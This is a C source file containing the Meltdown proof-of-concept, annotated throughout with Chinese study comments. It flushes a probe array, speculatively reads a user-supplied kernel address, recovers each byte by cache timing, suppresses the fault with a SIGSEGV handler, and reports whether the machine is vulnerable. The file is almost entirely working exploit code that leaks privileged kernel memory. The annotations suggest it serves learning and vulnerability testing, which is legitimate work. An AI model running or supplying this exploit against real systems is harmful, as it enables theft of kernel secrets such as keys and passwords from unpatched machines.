#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>

#include <x86intrin.h>

#include "rdtscp.h"

//#define DEBUG 1


#if !(defined(__x86_64__) || defined(__i386__))
# error "Only x86-64 and i386 are supported at the moment"
#endif


#define TARGET_OFFSET	12
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_READ	8
#define VARIANTS_READ	(1 << BITS_READ)

static char target_array[VARIANTS_READ * TARGET_SIZE]; //256*1024
//在调用speculate函数窃取数据之前，攻击者会故意冲洗掉target_array的缓存，也就是进行缓存侧信道攻击的Flush阶段
//这样才可以基于时间去探测
void clflush_target(void)
{
	int i;

	for (i = 0; i < VARIANTS_READ; i++) //0~255
		_mm_clflush(&target_array[i * TARGET_SIZE]);//遍历数组中的页对齐的每个单元,把对应的cache页置为无效
		//_mm_clflush是linux用于刷新缓存的函数【也许直接设置cache条目为无效】
}

extern char stopspeculate[];
//target_array为用于探测的数据，大小为256*4096
//addr为要探测的内核地址
//按字节泄露，每次读取addr中的一个字节【取值范围为0-255】
//cache缓存的单位是页，因此是4K
//接下来的缓存测信道攻击
static void __attribute__((noinline))
speculate(unsigned long addr) //(%[target], %%rax, 1)=target_array + %rax存储了攻击者要探测cache的内存地址。这个位置已经被cache到CPU缓存中了
{                             
#ifdef __x86_64__
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"
		//将攻击者的目标内核地址所指向的数据放入eax寄存器中，该操作会触发处理器异常【用户态读取内核数据】
		"movzx (%[addr]), %%eax\n\t" //这里读取了内核地址，如果没有预测执行，程序就会在这里crash；有了预测执行，程序就会执行完预测后的指令，再crash。分析POC时如何找到这个位置呢？gdb直接run，在哪里crash就知道在哪里访问了内核地址
		"shl $12, %%rax\n\t"    //<<12，也就是字节值*页大小
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n" //这里将eax泄露的信息，缓存到cache中了。当指令退休时进行安全检查，发现movzx (%[addr]), %%eax是越权指令，这时就会清空eax和rax涉及的rbx寄存器
		//但是缓存却没有被清空，因此rax的信息还可以在缓存中泄露
		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
#else /* ifdef __x86_64__ */
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%eax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%eax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%eax, 1), %%ebx\n"


		"stopspeculate: \n\t"   //捕获到SIGSEGV的时候【由movzx (%[addr]), %%eax触发】，回到这里执行nop
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
#endif
}


static int cache_hit_threshold;
static int hist[VARIANTS_READ];
void check(void) //为了检测不同内存数据访问的时间差异来探测被缓存过的数据。简单来说，获取数据就是获取target_array数组索引的过程。
{ //由于target_array的大小为256*4096，所以最多只要测试256次，就可以推测出内核地址指向的数据中的一个字节是否被访问过了。【所以要推测出内核地址指向的完整数据，需要不断循环这个过程。】
	int i, time, mix_i;
	volatile char *addr;

	for (i = 0; i < VARIANTS_READ; i++) {
		mix_i = ((i * 167) + 13) & 255; //硬编码了 167 和 13 进去，其实就是两个质数，目的就是让 cache 预读摸不着头脑，不会因为线性预读取干扰了测时。
		//如果读取是非线性的，那么cache不会进行相邻块预读取操作，就不会影响测时
		//同样是遍历0~255，通过i遍历可能会到cache预读取
		//而通过mix_i = ((i * 167) + 13) & 255来遍历，不会造成cache预读取，同时还可以保证“无序”遍历0~255
		addr = &target_array[mix_i * TARGET_SIZE];
		time = get_access_time(addr);   //来自于在Makefile中的生成的rdtscp.h【由detect_rdtscp.sh生成，根据cpu架构不同生成不同的.h文件】

		if (time <= cache_hit_threshold)
			hist[mix_i]++; //时间短，则说明是被缓存过的，此时mix_i的值就是泄露的字节值
	}
}//这里也就说明了为什么要定义256*4096大下的数组
//为了让不同的字节值（index）对应到不同的cache页，不会相互影响

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;

#ifdef __x86_64__
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;  //直接修改程序RIP到stopspeculate处执行
#else
	ucontext->uc_mcontext.gregs[REG_EIP] = (unsigned long)stopspeculate;
#endif
	return;
}

int set_signal(void)  //设置SIGSEGV异常处理函数，当捕获到段错误【用户程序访问内核空间时，会进入该信号处理函数sigsegv】
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};  //参考：https://www.cnblogs.com/wblyuyang/archive/2012/11/13/2768923.html
	//当 sa_flags 成员的值包含了 SA_SIGINFO 标志时，系统将使用 sa_sigaction 函数作为信号处理函数，
	return sigaction(SIGSEGV, &act, NULL);
}

#define CYCLES 1000
int readbyte(int fd, unsigned long addr) //每调用一次可以泄露一个字节，存储到hist中
{
	int i, ret = 0, max = -1, maxi = -1;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES; i++) { //泄露一个字节，多次尝试【1000次】，取综合最高的置信度的那个字节【避免旁道攻击的误差】
		ret = pread(fd, buf, sizeof(buf), 0); //用于带偏移量[最后一个参数]地原子地从文件中读取size[第三个参数]大小的数据
		if (ret < 0) { //如果proc/version还没有泄露完就继续泄露
			perror("pread");
			break;
		}

		clflush_target(); //在触发内核内存读取之前清空特定缓存页

		_mm_mfence(); //脏页写回，避免影响其他进程

		speculate(addr);
		check();  //执行完speculate，则执行check函数
	}

#ifdef DEBUG
	for (i = 0; i < VARIANTS_READ; i++)
		if (hist[i] > 0)
			printf("addr %lx hist[%x] = %d\n", addr, i, hist[i]);
#endif

	for (i = 1; i < VARIANTS_READ; i++) {
		if (!isprint(i))
			continue;
		if (hist[i] && hist[i] > max) { //取max，即最可能的字节值
			max = hist[i];
			maxi = i;
		}
	}

	return maxi; //返回最可能的泄露字节值，也就是target数组的index/4096
}

static char *progname;
int usage(void)
{
	printf("%s: [hexaddr] [size]\n", progname);
	return 2;
}

static int mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	if (0) {
		cache_hit_threshold = 80;
		return;
	}

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);   //刷空之后访问
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached);

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached, uncached, cache_hit_threshold);
}

static int min(int a, int b)
{
	return a < b ? a : b;
}

static void pin_cpu0()
{
	cpu_set_t mask;

	/* PIN to CPU0 */
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

int main(int argc, char *argv[])
{
	int ret, fd, i, score, is_vulnerable;
	unsigned long addr, size;
	static char expected[] = "%s version %s";

	progname = argv[0];
	if (argc < 3)
		return usage();

	if (sscanf(argv[1], "%lx", &addr) != 1)
		return usage();

	if (sscanf(argv[2], "%lx", &size) != 1)
		return usage();

	memset(target_array, 1, sizeof(target_array));

	ret = set_signal();
	pin_cpu0();

	set_cache_hit_threshold(); //确定判断是否缓存数据和非缓存数据的分界时间

	fd = open("/proc/version", O_RDONLY); //readbyte会每次从/proc/version中读取一个字节
	if (fd < 0) {
		perror("open");
		return -1;
	}

	for (score = 0, i = 0; i < size; i++) {
		ret = readbyte(fd, addr); //readbyte函数会循环调用clflush_target(),speculate(addr),check()，每次泄露一个字节
		//ret就是成功泄露的字节值
		if (ret == -1)
			ret = 0xff;
		printf("read %lx = %x %c (score=%d/%d)\n",
		       addr, ret, isprint(ret) ? ret : ' ',
		       ret != 0xff ? hist[ret] : 0,
		       CYCLES); //打印窃取的字节ret【hist[ret]应该是置信度，也就是对同一个字节的1000次泄露尝试中，有多少是成功的】

		if (i < sizeof(expected) &&
		    ret == expected[i])//看看泄露的字节和期待看到的字节是不是一样的
			score++;

		addr++; //泄露下一个字节
	}

	close(fd);
	//本次泄露打分，如果成功得到期待得到的字符串，那么说明存在该漏洞。
	is_vulnerable = score > min(size, sizeof(expected)) / 2;

	if (is_vulnerable)
		fprintf(stderr, "VULNERABLE\n");
	else
		fprintf(stderr, "NOT VULNERABLE\n");

	exit(is_vulnerable);
}
